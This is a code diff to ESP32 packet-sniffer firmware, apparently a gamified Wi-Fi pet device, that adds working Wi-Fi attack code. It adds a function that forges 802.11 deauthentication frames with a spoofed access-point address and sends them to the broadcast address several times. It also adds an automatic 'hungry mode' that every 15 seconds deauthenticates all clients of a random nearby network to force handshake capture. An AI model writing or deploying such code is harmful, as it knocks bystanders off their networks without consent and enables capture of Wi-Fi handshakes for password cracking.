@@ -1,12 +1,18 @@
 #include "PacketSniffer.h"
 
+extern "C" {
+  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_seq_net);
+}
+
 PacketSniffer *globalSniffer = NULL;
 
 PacketSniffer::PacketSniffer() {
     sdManager = NULL;
     currentChannel = 1;
     lastChannelHop = 0;
+    lastAttack = 0;
     isRunning = false;
+    techLevel = 1;
     handshakeDetected = false;
     deauthDetected = false;
     packetCount = 0;
@@ -17,6 +23,50 @@ PacketSniffer::PacketSniffer() {
     networkCount = 0;
     probeCount_arr = 0;
     pendingEvent = EVT_NONE;
+}
+
+void PacketSniffer::setTechLevel(int level) {
+    techLevel = level;
+}
+
+void PacketSniffer::sendDeauth(uint8_t* bssid, uint8_t* client) {
+    // 802.11 Deauth frame
+    // 26 bytes header + 2 bytes reason
+    uint8_t packet[26];
+
+    // Frame Control: Management (00), Deauth (1100) -> 0xC0
+    packet[0] = 0xC0;
+    packet[1] = 0x00;
+
+    // Duration
+    packet[2] = 0x3A;
+    packet[3] = 0x01;
+
+    // DA (Destination - Client or Broadcast)
+    memcpy(&packet[4], client, 6);
+
+    // SA (Source - AP BSSID)
+    memcpy(&packet[10], bssid, 6);
+
+    // BSSID
+    memcpy(&packet[16], bssid, 6);
+
+    // Seq Control
+    packet[22] = 0xF0;
+    packet[23] = 0xFF;
+
+    // Reason code (7 = Class 3 frame received from nonassociated STA)
+    packet[24] = 0x07;
+    packet[25] = 0x00;
+
+    // Send packet
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+
+    // Repeat a few times for effectiveness
+    for(int i=0; i<3; i++) {
+        esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+        delay(5);
+    }
 }
 
 void PacketSniffer::init(SDManager *sd) {
@@ -50,13 +100,42 @@ void PacketSniffer::stop() {
 void PacketSniffer::loop() {
     if (!isRunning) return;
     
-    // Channel hopping every 200ms
     unsigned long now = millis();
-    if (now - lastChannelHop > 200) {
-        lastChannelHop = now;
-        currentChannel++;
-        if (currentChannel > 13) currentChannel = 1;
-        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+
+    // Channel hopping (Unlocked at Level 4)
+    if (techLevel >= 4) {
+        if (now - lastChannelHop > 200) {
+            lastChannelHop = now;
+            currentChannel++;
+            if (currentChannel > 13) currentChannel = 1;
+            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+        }
+    }
+
+    // Active Attack / Hungry Mode (Unlocked at Level 10)
+    // If we haven't seen a handshake recently, try to force one
+    if (techLevel >= 10 && networkCount > 0) {
+        if (now - lastAttack > 15000) { // Cooldown 15s
+            // Only attack if we are "hungry" (no handshake detected recently)
+            // Or just do it anyway occasionally to be a "poltergeist"
+
+            // Pick a random network
+            int idx = random(0, networkCount);
+
+            // Only attack if it's on our current channel
+            if (networks[idx].channel == currentChannel) {
+                uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+                sendDeauth(networks[idx].bssid, broadcast);
+
+                lastAttack = now;
+                pendingEvent = EVT_ATTACK;
+                eventDetails = "ZAP! " + String(networks[idx].ssid);
+
+                Serial.print("Attacked: ");
+                Serial.println(networks[idx].ssid);
+            }
+        }
     }
 }
 
